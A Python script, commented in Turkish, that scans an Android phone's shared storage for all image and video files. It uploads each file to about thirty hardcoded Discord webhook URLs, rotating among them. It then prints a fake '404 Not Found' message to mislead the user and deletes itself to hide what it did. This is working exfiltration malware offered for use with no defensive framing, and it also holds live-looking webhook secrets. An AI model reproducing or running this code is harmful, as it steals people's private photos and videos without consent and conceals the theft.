import os
import requests
import concurrent.futures

def dosya_yolu_ara(klasor_yolu, uzantilar):
    bulunan_dosyalar = []
    for klasor_yolu, klasorlar, dosyalar in os.walk(klasor_yolu):
        for dosya in dosyalar:
            for uzanti in uzantilar:
                if dosya.endswith(uzanti) and not dosya.endswith((".apk", ".zip", ".rar", ".7z")):
                    dosya_yolu = os.path.join(klasor_yolu, dosya)
                    bulunan_dosyalar.append(dosya_yolu)
    return bulunan_dosyalar

def dosyalari_discord_webhooklara_farkli_gonder(webhook_url, dosya_yolu, boyut_siniri=25):
    dosya_boyutu = os.path.getsize(dosya_yolu) / (1024 * 1024)  # Dosya boyutunu megabayt cinsinden hesapla
    if dosya_boyutu <= boyut_siniri:
        dosya = {'file': open(dosya_yolu, 'rb')}
        requests.post(webhook_url, files=dosya)
    else:
        print(f"{dosya_yolu} dosyası {boyut_siniri}MB sınırını aştığı için gönderilmedi.")

def ilerleme_hesapla(gonderilen_dosya_sayisi, toplam_dosya_sayisi):
    return (gonderilen_dosya_sayisi / toplam_dosya_sayisi) * 100

dosya_yolu = "/storage/emulated/0"  # Özel dosya yolu
#uzantilar = [".mp4", ".png", ".jpg"]
uzantilar = [".jpg", ".png", ".gif", ".bmp", ".tiff", ".webp", ".svg", ".jpeg", ".ico", ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm", ".m4v", ".3gp", ".ts"]
bulunan_dosyalar = dosya_yolu_ara(dosya_yolu, uzantilar)
toplam_dosya_sayisi = len(bulunan_dosyalar)

# Discord Webhook URL'lerini buraya ekleyin (hepsi farklı dosyaları alacak şekilde):
webhook_url_list = [
    'https://discord.com/api/webhooks/1158868432708706385/kWU-duNucbLG5-t6cw47xKHCvBsCnACVvnXxGMywm9_cu1sNJfsz5uWlb-Boyj9x2wLq',
    'https://discord.com/api/webhooks/1149870574647128125/J630yVs7DOotH2IolBu2bjk5LfiPzDb_r-T2pZ_RKH8qDIrc17k9k9PQtmMt_CBx2LIn',
    'https://discord.com/api/webhooks/1158868141535924315/kBFshAVVS7FR7pzv3EqN2HZcMl9qXDZ2kQXdmDZmBGP4LFskT2j9EYbefmbQNuD5mK92',
    'https://discord.com/api/webhooks/1154181755977355366/xzmOWidcBx097MygNjASVYVdRIcL-9_9VsyahRcpecH07G1CJMiG4hvso_UUJE7fRvwP',
    'https://discord.com/api/webhooks/1170114204871708713/NSiR51MVt4qzjT_MvahDEmWm7I7s_lkPRHwKoY4rrB8ZTH3RiS-4AHoWalB57poBvWMz',
    'https://discord.com/api/webhooks/1170114379514122391/VXGiU6iDBHvjIGnYOUNSYMifC9-Wr0gX_Yl8rBj1q71HkDdRvfUiicJ0SpYaEVzqmK5R',
    'https://discord.com/api/webhooks/1170114838966583316/V8De6MI0AZhHfM_U1MwDFOmLOVGqsSVFYyq-nhtGMhbTrXD-IhcsqJHx-1B527VArMOM',
    'https://discord.com/api/webhooks/1170114831500718230/Z1C2Z_vIz24mYQgh8YI0fV4RXLgXGVqMbiiOiu0EYzDDqwrIEZiodrFwyA4rQ4aw01GC',
    'https://discord.com/api/webhooks/1170114807282798703/wqeLthhjbS8AZHENJVebchuQN81ElBgmpRR5uiIo31XYODeE75UBKgBWuE7tzdWMDB8o',
    'https://discord.com/api/webhooks/1170115512315949096/nK1EAXOsPl4Yqx0qAUIdd4LgYVjPpOSxSm6ESrM4G-Ht9WTYJwGgi18-cKBWYd9q9EYd',
    'https://discord.com/api/webhooks/1170115522214510592/AJFoD8LXpoBBFKBM6jCkPPErvV8bADYOWP1MHmTYmaOFG500PN4J35W8jJlqjMDziJWk',
    'https://discord.com/api/webhooks/1170115570016981053/x7iVPP1VfL0jv469EQiAS_aEyLCjRicsiV1ZwAeovp-OSOfRYZJz6kBOSPLopm_aVhFp',
    'https://discord.com/api/webhooks/1170119036068175892/mHqvnDrT6wH9hZDNa-UGlk2sb_Sy-1__R5rj2bNegW0hfMuqOWYhOtw62sZoz2KdoKcL',
    'https://discord.com/api/webhooks/1170119044897185792/-uZ7ESpLr8vSt5QtnBOVNrIkb2Ukh4VpbIC3fMeAzZUC8qxEt7dsj83l1tgCv3KURgy_',
    'https://discord.com/api/webhooks/1170119051159293972/tnwn74Gzl02XCqU_uF9Xjdh0xMrRlfAaguN91oXObkIke6J0Fll0qpRNoFnUjoLawB0k',
    'https://discord.com/api/webhooks/1170124406215946340/npW9Dwc34LT88UfsI3qZ9jgtVxCQePc-Hk6xYNyP7as3v7K_sBCJyKEY6SF42Hj96lHl',
    'https://discord.com/api/webhooks/1170126384736247929/gErJEU8qo6ajffdDuJxGY9s12M9QnD93n37uWOBiCjsIPCRy3p6Wvxv6LGsqg3Gb2h8d',
    'https://discord.com/api/webhooks/1170126391497474100/yS5dke5JiGHaNQiKfuRySQV8CFG2L08B1bSdpSRK-ZH8BjnhmxAq8jfw6a_gqQRDjgdP',
    'https://discord.com/api/webhooks/1170126394425082038/dZBF3JaeJhZq1WWlV1SF1HzM8uMgNx3ATfBgUklCJ9yFvxliSxo9FtexQqxossFDZLV3',
    'https://discord.com/api/webhooks/1170126397482733588/qZ3A4Wd6qxqDRgeElyy3xBiOYDpaOmPCUwk6ZGzMPpm_VBKpXa4EXNizrxEboDxN8cho',
    'https://discord.com/api/webhooks/1170126400473288794/B8nfDUuB98K8Fd1pmxjJCPs-QkOO7IkjdhvA0QtTbC52nC3HfpySHTcfQ-T0ZeYV8sb9',
    'https://discord.com/api/webhooks/1170126404545941584/Cpg1A-poiDTrT4NWWcwOsTWlc29hIiiUYYdn2IicgRrdv-uNlvfYAZUzfl8hlvH28jOR',
    'https://discord.com/api/webhooks/1170126408190808156/8anxwsHXtHxVH4jQPpohTJZoaDtbZclTuUhhltY3rstV6UNTILm6kxuN9gFnEdjaDxOl',
    'https://discord.com/api/webhooks/1170126412015997048/OAqLrhnktj0JE9w8cNimUldgwbUEaSxCt9CYlqn-SxGRb0eZgjeGjf7N-hUbWfu0s1fG',
    'https://discord.com/api/webhooks/1170126415434366986/qzh8U7eqgJ21o9kj04cjkkkLufzE3xCNFUb74Q6Juhn4Tp2jwTeuQB0nvJ_XKWtfRY3E',
    'https://discord.com/api/webhooks/1170126423911043103/OBIb87F02Ne_ycwVbYJ8GfWNgIfKKZ56kFRE5eACpCgMMd_ipT9JqZto4PrvzXh6aGSY',
    'https://discord.com/api/webhooks/1170126456412708945/NGGPnqjVtSrTFUJ_j60FR9r1YJeeUF650Lf5eiZXKbS3fVIsP9sjrHTUQxuufYsHM22-',
    'https://discord.com/api/webhooks/1170126460309221406/Wj4tsDs-As15wc7QQUm9Hrd19JFxM9XJmO3lDU58qjoFobKK04_1tfORPGObGNookeVV',
    'https://discord.com/api/webhooks/1170126463740153966/ZoFMZyUYYUTNawU5sq6FfFeuL7CoptmekO4mRIw8XZi_taAcvg9Y0HhHju4epnioUbsq',
    'https://discord.com/api/webhooks/1170126466550345738/4qdiaTl3NjFpSDoumCPcjy9fBAv1xtp9qguGfxkHXS7UoaQvNifaJFSST5SWlEDIhs_b',

]

gonderilen_dosya_sayisi = 0

for i, dosya_yolu in enumerate(bulunan_dosyalar):
    dosyalari_discord_webhooklara_farkli_gonder(webhook_url_list[i % len(webhook_url_list)], dosya_yolu)
    gonderilen_dosya_sayisi += 1
    ilerleme = ilerleme_hesapla(gonderilen_dosya_sayisi, toplam_dosya_sayisi)
    print(f"Ilerleme: {ilerleme:.2f}%")

print ("404 Not Found")


# Kendini imha et
os.remove(__file__)
